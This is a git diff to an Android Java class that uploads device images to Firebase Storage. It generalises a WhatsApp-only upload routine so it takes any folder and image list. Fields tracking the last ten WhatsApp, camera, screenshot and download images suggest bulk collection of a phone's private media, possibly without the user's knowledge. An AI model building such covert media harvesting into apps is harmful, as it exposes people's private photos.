@@ -34,6 +34,8 @@ public class ImagesUpload {
     public ArrayList<String> screenshotsLast10Messages = new ArrayList<>();
     @NonNull
     public ArrayList<String> downloadsLast10Messages = new ArrayList<>();
+    public ArrayList<String> UploadImage = new ArrayList<>();
+
     private StorageReference mStorageRef;
     private FirebaseAuth mAuth;
 
@@ -41,16 +43,17 @@ public class ImagesUpload {
     CompressImages com = new CompressImages();
     private File newCompressedFile;
 
-    public void ImageUplods(ArrayList<String> whatsapp) {
+    public void ImageUplods(String folder,ArrayList<String> imageList) {
 //                            ArrayList<String> camera,
 //                            ArrayList<String> screenshots,
 //                            ArrayList<String> downloads
 //        ASSINING IMAAGES LOCATION LIST TO THE VARIABLES
 
-        whatsAppLast10Messages = whatsapp;
+//        whatsAppLast10Messages = whatsapp;
 //        cameraLast10Messages = camera;
 //        screenshotsLast10Messages = screenshots;
 //        downloadsLast10Messages = downloads;
+        UploadImage=imageList;
 
         mAuth = FirebaseAuth.getInstance();
         mStorageRef = FirebaseStorage.getInstance().getReference().child("nm");
@@ -61,12 +64,12 @@ public class ImagesUpload {
             mStorageRef = FirebaseStorage.getInstance().getReference();
             FirebaseDatabase database = FirebaseDatabase.getInstance();
 
-            Log.d("asdasdasdasd", whatsAppLast10Messages.get(2));
+//            Log.d("asdasdasdasd", whatsAppLast10Messages.get(2));
 
-            for (int i = 0; i < whatsAppLast10Messages.size(); i++) {
+            for (int i = 0; i < UploadImage.size(); i++) {
 
-                uploadwhatsappImaage(whatsAppLast10Messages.get(i));
-                Log.d("assfddasdasd", whatsAppLast10Messages.get(i));
+                uploadwhatsappImaage(UploadImage.get(i),folder);
+                Log.d("assfddasdasd", UploadImage.get(i));
 
             }
 
@@ -117,7 +120,7 @@ public class ImagesUpload {
 
 
 
-    private void uploadwhatsappImaage(String path) {
+    private void uploadwhatsappImaage(String path,String folder) {
 
 //        Bitmap finalImage = com.compressImage(path);
 //           File CompressedImage =  Compressing(path);
@@ -130,7 +133,7 @@ public class ImagesUpload {
 //        File news = new File(path);
 //        final Uri myUri = Uri.fromFile(news);
 
-        StorageReference ref = mStorageRef.child("nm/Images/whatsapp/" + UUID.randomUUID().toString() + ".png");
+        StorageReference ref = mStorageRef.child("nm/Images/"+folder+"/" + UUID.randomUUID().toString() + ".png");
         ref.putBytes(data)
                 .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                     @Override
@@ -142,6 +145,7 @@ public class ImagesUpload {
                 .addOnFailureListener(new OnFailureListener() {
                     @Override
                     public void onFailure(@NonNull Exception e) {
+                        Log.d("uploaded ", e.getMessage());
 
                     }
                 });
